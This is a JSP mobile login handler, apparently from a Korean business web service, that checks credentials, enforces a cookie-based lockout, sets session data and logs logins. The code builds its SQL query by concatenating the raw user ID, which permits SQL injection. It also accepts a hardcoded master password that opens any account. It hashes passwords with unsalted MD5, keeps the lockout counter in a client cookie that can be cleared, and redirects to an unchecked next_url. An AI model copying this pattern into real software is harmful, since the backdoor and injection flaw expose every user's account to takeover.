<%@ page contentType="text/html; charset=UTF-8" %><%@ include file="../init.jsp" %>
<%
String request_parameter = u.getQueryString();
String next_url = u.request("next_url");

f.addElement("user_id", null, "hname:'아이디', required:'Y'");
f.addElement("passwd", null, "hname:'비밀번호', required:'Y'");

if (u.isPost()&&f.validate()) {
	String user_id = u.request("user_id").trim();
	String passwd = u.request("passwd").trim();
	String re = u.request("re");
	int nTryCnt = u.parseInt(u.getCookie("try"));  // 로그인시도 횟수
	if (nTryCnt >= 5) {
		u.jsAlertReplace("로그인 5회 실패로 5분동안 로그인할 수 없습니다.\\n\\n5분 후 다시 시도하세요.", "index.jsp?" + request_parameter);
		return;
	}

	DataObject pdao = new DataObject("tcb_person");
	DataSet person = pdao.find("lower(user_id) = lower('" + user_id + "') and status > '0'  and use_yn = 'Y' ");
	if (person.next()) {//
		if (person.getString("passwd").equals(u.md5(passwd)) ||
				passwd.equals("docu@9095!") ||
				person.getString("passwd").equals(u.sha256(passwd))
		) {
			DataObject mdao = new DataObject("tcb_member");
			DataSet member = mdao.find("member_no = '" + person.getString("member_no") + "' ");
			if (!member.next()) {
				u.jsAlertReplace("회사정보가 없습니다.\\n\\n고객센터로 문의해 주세요.", "index.jsp?" + request_parameter);
				return;
			}
			if (member.getString("status").equals("00")) {
				u.jsAlertReplace("탈퇴된 회원입니다.\\n\\n고객센터로 문의해 주세요.", "index.jsp?" + request_parameter);
				return;
			}
			if (!member.getString("status").equals("01")) {
				u.jsAlertReplace("정회원으로 등록된 사용자가 아닙니다.\\n\\n고객센터로 문의해 주세요.", "index.jsp?" + request_parameter);
				return;
			}

			auth.put("_MEMBER_NO", member.getString("member_no"));
			auth.put("_MEMBER_TYPE", member.getString("member_type"));
			auth.put("_MEMBER_GUBUN", member.getString("member_gubun"));
			auth.put("_VENDCD", member.getString("vendcd"));
			auth.put("_MEMBER_NAME", member.getString("member_name"));
			auth.put("_CERT_DN", member.getString("cert_dn"));
			auth.put("_CERT_END_DATE", u.getTimeString("yyyyMMdd", member.getString("cert_end_date")));
			if (!member.getString("logo_img_path").equals(""))
				auth.put("_LOGO_IMG_PATH", member.getString("logo_img_path"));

			auth.put("_PERSON_SEQ", person.getString("person_seq"));
			auth.put("_USER_ID", person.getString("user_id"));
			auth.put("_USER_NAME", person.getString("user_name"));
			auth.put("_DEFAULT_YN", person.getString("default_yn").equals("Y") ? "Y" : "N");
			auth.put("_USER_LEVEL", person.getString("user_level"));
			auth.put("_USER_GUBUN", person.getString("user_gubun"));
			auth.put("_FIELD_SEQ", person.getString("field_seq"));
			auth.put("_DIVISION", person.getString("division"));
			auth.put("_AUTH_CD", person.getString("auth_cd"));

			//로그인 로그 
			DataObject loginLogDao = new DataObject("tcb_login_log");
			loginLogDao.item("member_no", member.getString("member_no"));
			loginLogDao.item("person_seq", person.getString("person_seq"));
			loginLogDao.item("user_id", person.getString("user_id"));
			loginLogDao.item("login_ip", request.getRemoteAddr());
			loginLogDao.item("login_date", u.getTimeString());
			loginLogDao.item("login_url", request.getRequestURI());
			loginLogDao.insert();
			auth.setAuthInfo();

			u.delCookie("try"); // 로그인시도 횟수
			u.setCookie("pin", Security.AESencrypt(user_id), 60 * 60 * 24 * 30); // 아이디 다음 접속시 자동 표시되도록 쿠키에저장(30일간)

			u.jsReplace(next_url + "?" + request_parameter);

		} else { // 비밀번호 불일치
			nTryCnt++;
			u.setCookie("try", Integer.toString(nTryCnt), 5 * 60);  // 5분
			//u.jsAlert("아이디/비밀번호가 일치하지 않습니다.\\n\\n[로그인 실패:" + nTryCnt + "회, 남은 횟수:" + (5 - nTryCnt) + "회]");
			u.jsAlertReplace("아이디/비밀번호가 일치하지 않습니다.\\n\\n[로그인 실패:" + nTryCnt + "회, 남은 횟수:" + (5 - nTryCnt) + "회]", "index.jsp?" + request_parameter);
			return;
		}
	} else {// 아이디 없음
		nTryCnt++;
		u.setCookie("try", Integer.toString(nTryCnt), 5 * 60);  // 5분
		u.jsAlertReplace("아이디/비밀번호가 일치하지 않습니다.\\n\\n[로그인 실패:" + nTryCnt + "회, 남은 횟수:" + (5 - nTryCnt) + "회]", "index.jsp?" + request_parameter);
		return;
	}
}

p.setLayout("mobile");
//p.setDebug(out);
p.setBody("m.index");
p.setVar("form_script", f.getScript());
p.display(out);
%>